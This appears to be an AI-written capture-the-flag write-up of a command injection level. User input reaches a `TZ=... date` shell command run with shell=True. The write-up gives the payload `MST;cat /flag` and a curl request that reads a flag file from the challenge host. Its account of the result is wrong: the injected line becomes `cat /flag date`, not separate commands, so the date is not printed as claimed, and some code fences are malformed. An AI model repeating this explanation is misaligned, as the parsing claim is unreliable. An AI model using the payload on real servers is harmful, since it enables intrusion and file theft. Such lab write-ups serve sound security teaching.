Here’s a writeup in `.md` format for this Command Injection level using the `TZ` environment variable:

````markdown
# Command Injection Level: Environment Variable Injection

## Challenge Overview

This level challenges us to perform command injection using an environment variable in a shell command. The server takes a `tzid` (timezone ID) parameter from the user and uses it to set the `TZ` environment variable before calling the `date` command.

### Vulnerable Code

```python
arg = flask.request.args.get("tzid", "MST") 
command = f"TZ={arg} date"
````

The command is constructed as:

```bash
TZ=user_input date
```

This command is then executed in a shell with `shell=True`, making it vulnerable to shell command injection if the `arg` is not properly sanitized.

## Understanding the Vulnerability

The key vulnerability lies in the fact that the `arg` is directly injected into an environment variable declaration in a **shell command**:

```bash
TZ=<user input> date
```

Because `shell=True` is used, we can inject shell metacharacters like `;`, `&&`, or `|` to terminate the `TZ` assignment and execute arbitrary commands.

## Exploitation Strategy

We can use the `;` character to terminate the `TZ` assignment and then run our own command such as `cat /flag`.

### Payload

```bash
MST;cat /flag
```

* `MST` is a valid timezone (used here to keep the command syntactically valid).
* `;` separates the `TZ` assignment from our injected command.
* `cat /flag` reads the flag file.

### URL-Encoded Version

To inject this via a browser or `curl`, we must URL-encode special characters:

* `;` → `%3B`
* space → `%20`

Final Payload:

```bash
curl "http://challenge.localhost/event?tzid=MST%3Bcat%20/flag"
```

## Final Exploit

```bash
curl "http://challenge.localhost/event?tzid=MST%3Bcat%20/flag"
```

This request results in the following command executed on the server:

```bash
TZ=MST;cat /flag date
```

In practice, due to how shell parsing works, the command effectively becomes:

```bash
TZ=MST
cat /flag
date
```

And both the flag and the date are displayed.

## Conclusion

By exploiting the shell's interpretation of the `TZ=<value>` format and injecting a command using `;`, we can execute arbitrary shell commands on the server.

---

### Key Takeaways

* Even **environment variable assignments** can be vectors for command injection if user input is inserted unsafely.
* Using `shell=True` amplifies risks; always avoid it if possible or properly sanitize inputs.
* Understanding how shell parses commands is crucial for both **finding** and **exploiting** injection points.
